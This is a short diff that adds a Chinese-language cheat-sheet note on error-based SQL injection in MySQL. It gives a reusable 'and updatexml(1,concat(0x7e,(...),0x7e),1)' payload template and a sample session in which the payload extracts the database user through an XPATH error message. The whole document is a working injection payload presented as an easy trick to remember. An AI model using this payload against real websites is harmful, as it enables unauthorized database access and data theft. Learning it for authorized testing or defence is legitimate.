@@ -1,0 +1,6 @@
+这种报错注入比较好记
+and updatexml(1,concat(0x7e,(注入语句),0x7e),1)
+
+例子：mysql> select * from users where id=1 and updatexml(1,concat(0x7e,(select user()
+),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
